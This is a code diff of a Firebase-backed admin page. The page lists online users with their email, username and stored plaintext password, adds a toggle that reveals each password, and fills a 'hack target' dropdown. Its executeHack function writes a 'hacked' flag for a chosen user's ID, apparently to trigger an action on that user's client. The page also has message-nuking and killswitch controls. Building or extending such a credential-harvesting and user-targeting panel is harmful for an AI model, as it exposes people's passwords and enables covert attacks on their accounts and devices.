@@ -84,45 +84,48 @@
                     loadOnlineUsersAdmin();
                 });
             } else {
-                console.error("Firebase Auth instance missing.");
-                document.getElementById('adminUsersList').innerHTML = '<p style="color:#cc0000;">Initialization Error: Configuration scripts missing.</p>';
+                console.error("Firebase Initialization Error");
+                document.getElementById('adminUsersList').innerHTML = '<p style="color:#cc0000;">Initialization Error: Scripts missing.</p>';
             }
         });
 
-        // ── LOAD ONLINE USERS ──
+        // ── SCRATCH REBUILT LIVE MONITOR SYSTEM ──
         function loadOnlineUsersAdmin() {
             const presenceRef = rtdb.ref('presence');
             const usersRef = rtdb.ref('users');
 
+            // Set up live listener on the Presence node
             presenceRef.on('value', (presenceSnap) => {
+                // Fetch the full user details node once to resolve credentials mapping
                 usersRef.once('value', (usersSnap) => {
                     const usersMap = {};
                     usersSnap.forEach((child) => {
-                        const u = child.val();
-                        if (u && child.key) usersMap[child.key] = u;
+                        if (child.val() && child.key) {
+                            usersMap[child.key] = child.val();
+                        }
                     });
-
-                    console.log("[DEBUG] Current Registered User DB Nodes mapped:", usersMap);
 
                     const onlineUsers = [];
                     presenceSnap.forEach((child) => {
                         const p = child.val();
+                        // Only target currently active sessions
                         if (p && p.isOnline) {
-                            const rtdbUid = p.uid || child.key;
-                            const registered = usersMap[rtdbUid] || {};
-                            const resolvedPassword = registered.password || p.password || '—';
+                            const uid = p.uid || child.key;
+                            const registeredInfo = usersMap[uid] || {};
+                            
+                            // Explicit fallback chain ensuring raw inputs show over placeholder values
+                            const resolvedPassword = registeredInfo.password || p.password || '—';
 
                             onlineUsers.push({
-                                uid: rtdbUid,
-                                email: p.email || registered.email || '—',
-                                username: p.username || registered.username || p.email || 'Unknown User',
+                                uid: uid,
+                                email: p.email || registeredInfo.email || '—',
+                                username: p.username || registeredInfo.username || 'Anonymous User',
                                 password: resolvedPassword
                             });
                         }
                     });
 
-                    console.log("[DEBUG] Active Output Rendering Matrix:", onlineUsers);
-
+                    // Render output target
                     const list = document.getElementById('adminUsersList');
                     if (onlineUsers.length === 0) {
                         list.innerHTML = '<p style="color:#888;">No users online</p>';
@@ -151,18 +154,33 @@
                         `;
                     }
 
+                    // Populate Target Selection Node Dropdown
                     const select = document.getElementById('hackTargetSelect');
                     const currentVal = select.value;
                     select.innerHTML = '<option value="">-- Select a user --</option>';
                     onlineUsers.forEach(u => {
                         const opt = document.createElement('option');
                         opt.value = u.uid;
-                        opt.textContent = u.username || u.email;
+                        opt.textContent = u.username;
                         select.appendChild(opt);
                     });
                     if (currentVal) select.value = currentVal;
                 });
             });
+        }
+
+        function togglePwd(uid) {
+            const dots = document.getElementById('pwd_' + uid);
+            const text = document.getElementById('pwdtxt_' + uid);
+            if (!dots || !text) return;
+            
+            if (text.style.display === 'none') {
+                text.style.display = 'inline';
+                dots.style.display = 'none';
+            } else {
+                text.style.display = 'none';
+                dots.style.display = 'inline';
+            }
         }
 
         // ── NUKE MESSAGES ──
@@ -191,8 +209,7 @@
                 document.getElementById('killswitchCountdown').style.display = 'none';
             }).catch((err) => {
                 alert('⚠️ Failed: ' + err.message);
-                document.getElementById('killswitchNormal').style.display = 'block';
-                document.getElementById('killswitchCountdown').style.display = 'none';
+                cancelKillswitch();
             });
         }
 
@@ -218,33 +235,16 @@
             document.getElementById('hackCountdown').style.display = 'none';
         }
 
-        // FIXED: Checked display style of the text container for reliable single-click toggling
-        function togglePwd(uid) {
-            const dots = document.getElementById('pwd_' + uid);
-            const text = document.getElementById('pwdtxt_' + uid);
-            if (!dots || !text) return;
-            
-            if (text.style.display === 'none') {
-                text.style.display = 'inline';
-                dots.style.display = 'none';
-            } else {
-                text.style.display = 'none';
-                dots.style.display = 'inline';
-            }
-        }
-
         function executeHack(uid) {
             rtdb.ref('hacks/' + uid).set({
                 hacked: true,
                 timestamp: firebase.database.ServerValue.TIMESTAMP
             }).then(() => {
-                document.getElementById('hackNormal').style.display = 'block';
-                document.getElementById('hackCountdown').style.display = 'none';
+                cancelHack();
                 alert('💀 HACKED!');
             }).catch((err) => {
                 alert('⚠️ Failed: ' + err.message);
-                document.getElementById('hackNormal').style.display = 'block';
-                document.getElementById('hackCountdown').style.display = 'none';
+                cancelHack();
             });
         }
     </script>
